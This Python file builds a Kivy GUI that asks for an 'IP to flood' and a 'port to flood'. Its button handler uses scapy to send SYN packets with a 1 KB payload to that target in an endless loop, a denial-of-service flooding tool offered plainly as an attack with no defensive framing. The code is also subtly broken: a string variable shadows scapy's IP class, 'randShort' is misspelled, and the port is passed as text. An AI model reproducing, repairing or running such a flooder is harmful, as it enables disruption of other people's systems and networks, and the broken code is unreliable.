from scapy.all import *
import kivy
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.gridlayout import GridLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button

class MyApp(App):
    def build(self):
        return MyGrid()


class MyGrid(GridLayout):
    def __init__(self, **kwargs):
        super(MyGrid, self).__init__(**kwargs)
        self.cols = 1
        
        self.inside = GridLayout() # Creating a new grid layout
        self.inside.cols = 2 # setting collumns for the layout

        self.add_widget(Label(text="IP TO FLOOD: "))
        self.IP = TextInput(multiline=False)
        self.add_widget(self.IP)

        self.add_widget(Label(text="PORT TO FLOOD: "))
        self.PORT = TextInput(multiline=False)
        self.add_widget(self.PORT)
        
        self.add_widget(self.inside)
        #Empty lines to make reading easier for me
        self.submit = Button(text="Submit", font_size=40)
        #more empty lines
        self.add_widget(self.submit) # Add the button to the main layout 

        self.submit.bind(on_press=self.pressed)

    def pressed(self, instance):
    	IP = self.IP.text
    	PORT = self.PORT.text 

    	target_ip = (IP)
    	target_port = (PORT)

    	ip = IP(dst = target_ip)
    	tcp = TCP(sport=randShort(), dport=target_port, flags="S")
    	raw = Raw(b"X"*1024)
    	p = ip / tcp / raw
    	send(p, loop=1, verbose=0)

if __name__ == "__main__":
    MyApp().run()
